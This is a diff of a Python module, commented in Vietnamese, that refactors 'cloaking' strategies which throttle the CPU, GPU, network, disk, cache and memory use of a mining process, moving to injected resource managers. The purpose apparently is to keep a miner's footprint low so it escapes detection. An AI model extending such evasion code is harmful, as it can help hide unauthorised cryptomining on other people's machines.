@@ -6,20 +6,23 @@ import subprocess
 import psutil
 import pynvml
 import traceback
+import asyncio
 from abc import ABC, abstractmethod
 from typing import Dict, Any, List, Tuple, Optional, Type
+from typing import TYPE_CHECKING
 
-import asyncio
+from .utils import MiningProcess
 
-from .utils import MiningProcess  
-from .resource_control import (
-    CPUResourceManager,
-    GPUResourceManager,
-    NetworkResourceManager,
-    DiskIOResourceManager,
-    CacheResourceManager,
-    MemoryResourceManager
-)
+  
+if TYPE_CHECKING:
+    from .resource_control import (
+        CPUResourceManager,
+        GPUResourceManager,
+        NetworkResourceManager,
+        DiskIOResourceManager,
+        CacheResourceManager,
+        MemoryResourceManager
+    )
 
 ###############################################################################
 #                 LỚP CƠ SỞ: CloakStrategy (HƯỚNG SỰ KIỆN - EVENT-DRIVEN)    #
@@ -73,7 +76,7 @@ class CpuCloakStrategy(CloakStrategy):
       - Đảm bảo tương thích với mô hình async/event-driven.
     """
 
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger, cpu_resource_manager: 'CPUResourceManager' ):
         """
         Khởi tạo CpuCloakStrategy với cấu hình và logger.
 
@@ -105,7 +108,7 @@ class CpuCloakStrategy(CloakStrategy):
         self.process_cgroup: Dict[int, str] = {}
 
         # Khởi tạo ResourceManager cụ thể
-        self.cpu_resource_manager = CPUResourceManager(logger)
+        self.cpu_resource_manager = cpu_resource_manager
 
     async def apply(self, process: MiningProcess) -> None:
         """
@@ -224,7 +227,7 @@ class GpuCloakStrategy(CloakStrategy):
       - Khôi phục cài đặt gốc khi không cần cloaking.
     """
 
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger, gpu_resource_manager: 'GPUResourceManager'):
         self.logger = logger
 
         self.throttle_percentage = config.get('throttle_percentage', 20)
@@ -244,9 +247,8 @@ class GpuCloakStrategy(CloakStrategy):
         if not isinstance(self.fan_speed_increase, (int, float)) or not (0 <= self.fan_speed_increase <= 100):
             logger.warning("Giá trị fan_speed_increase không hợp lệ, mặc định 20%.")
             self.fan_speed_increase = 20
-
-        from .utils import GPUManager 
-        self.gpu_resource_manager = GPUResourceManager(logger, GPUManager())
+ 
+        self.gpu_resource_manager = gpu_resource_manager
 
     async def apply(self, process: MiningProcess) -> None:
         """
@@ -366,7 +368,7 @@ class NetworkCloakStrategy(CloakStrategy):
       - Khôi phục cài đặt ban đầu khi không cần cloaking.
     """
 
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger, network_resource_manager: 'NetworkResourceManager'):
         self.logger = logger
 
         self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
@@ -379,7 +381,7 @@ class NetworkCloakStrategy(CloakStrategy):
             # Tự động xác định
             self.network_interface = self.get_primary_network_interface() or "eth0"
 
-        self.network_resource_manager = NetworkResourceManager(logger)
+        self.network_resource_manager = network_resource_manager
         self.process_marks: Dict[int, int] = {}
 
     async def apply(self, process: MiningProcess) -> None:
@@ -496,7 +498,7 @@ class DiskIoCloakStrategy(CloakStrategy):
       - Khôi phục khi không cần cloaking.
     """
 
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger, disk_io_resource_manager: 'DiskIOResourceManager'):
         self.logger = logger
 
         self.io_weight = config.get('io_weight', 500)
@@ -504,7 +506,7 @@ class DiskIoCloakStrategy(CloakStrategy):
             logger.warning(f"io_weight không hợp lệ: {self.io_weight}. Mặc định 500.")
             self.io_weight = 500
 
-        self.disk_io_resource_manager = DiskIOResourceManager(logger)
+        self.disk_io_resource_manager = disk_io_resource_manager
 
     async def apply(self, process: MiningProcess) -> None:
         """
@@ -578,7 +580,7 @@ class CacheCloakStrategy(CloakStrategy):
       - Khôi phục cài đặt gốc khi không cần cloaking.
     """
 
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
+    def __init__(self, config: Dict[str, Any], logger: logging.Logger, cache_resource_manager: 'CacheResourceManager'):
         self.logger = logger
 
         self.cache_limit_percent = config.get('cache_limit_percent', 50)
@@ -586,7 +588,7 @@ class CacheCloakStrategy(CloakStrategy):
             logger.warning(f"cache_limit_percent không hợp lệ: {self.cache_limit_percent}. Mặc định 50%.")
             self.cache_limit_percent = 50
 
-        self.cache_resource_manager = CacheResourceManager(logger)
+        self.cache_resource_manager = cache_resource_manager
 
     async def apply(self, process: MiningProcess) -> None:
         """
@@ -669,7 +671,13 @@ class MemoryCloakStrategy(CloakStrategy):
       - Khôi phục cài đặt khi không cần cloaking.
     """
 
-    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
+    def __init__(
+        self,
+        config: Dict[str, Any],
+        logger: logging.Logger,
+        memory_resource_manager: 'MemoryResourceManager',
+        cache_resource_manager: 'CacheResourceManager'  # Tiêm CacheResourceManager
+    ):
         self.logger = logger
 
         self.memory_limit_percent = config.get('memory_limit_percent', 50)
@@ -677,8 +685,8 @@ class MemoryCloakStrategy(CloakStrategy):
             logger.warning(f"memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định 50%.")
             self.memory_limit_percent = 50
 
-        self.memory_resource_manager = MemoryResourceManager(logger)
-        self.cache_resource_manager = CacheResourceManager(logger)
+        self.memory_resource_manager = memory_resource_manager
+        self.cache_resource_manager = cache_resource_manager
 
     async def apply(self, process: MiningProcess) -> None:
         """
@@ -689,10 +697,12 @@ class MemoryCloakStrategy(CloakStrategy):
         try:
             pid, process_name = self.get_process_info(process)
 
-            success_drop = await asyncio.to_thread(self.cache_resource_manager.drop_caches)
+            # Drop caches
+            success_drop = await asyncio.to_thread(self.cache_resource_manager.drop_caches, pid)
             if success_drop:
                 self.logger.info(f"[Memory Cloaking] Drop caches cho {process_name} (PID={pid}).")
 
+            # Giới hạn memory
             memory_limit_mb = self.calculate_memory_limit_mb()
             success_limit = await asyncio.to_thread(
                 self.memory_resource_manager.set_memory_limit,
@@ -723,23 +733,31 @@ class MemoryCloakStrategy(CloakStrategy):
         """
         Khôi phục memory (event-driven):
          - Gỡ giới hạn memory,
-         - Không cần drop caches lần nữa.
+         - Khôi phục cache usage.
         """
         try:
             pid, process_name = self.get_process_info(process)
 
-            # Gỡ giới hạn cache => 100%
-            success_limit = await asyncio.to_thread(
-                self.cache_resource_manager.limit_cache_usage,
-                100
+            # Khôi phục giới hạn memory
+            success_restore_memory = await asyncio.to_thread(
+                self.memory_resource_manager.restore_resources,
+                pid
             )
-            if success_limit:
-                self.logger.info(f"[Memory Restore] Khôi phục giới hạn cache=100% cho PID={pid}.")
+            if success_restore_memory:
+                self.logger.info(f"[Memory Restore] Khôi phục giới hạn memory cho PID={pid}.")
+            else:
+                self.logger.error(f"[Memory Restore] Không thể khôi phục memory cho PID={pid}.")
 
-            # T tuỳ ý (nếu có hàm restore_memory_settings).
-            # Ở đây ta chỉ nêu ví dụ: set_memory_limit(pid, 'max') nếu resource_manager có
-            # sẵn hàm tương tự.
-            # Lưu ý: T tuỳ dự án mà cài đặt.
+            # Khôi phục cache usage về 100%
+            success_restore_cache = await asyncio.to_thread(
+                self.cache_resource_manager.limit_cache_usage,
+                100,
+                pid
+            )
+            if success_restore_cache:
+                self.logger.info(f"[Memory Restore] Khôi phục giới hạn cache=100% cho PID={pid}.")
+            else:
+                self.logger.error(f"[Memory Restore] Không thể khôi phục cache cho PID={pid}.")
 
             self.logger.info(f"[Memory Restore] Hoàn tất khôi phục Memory cho {process_name} (PID={pid}).")
 
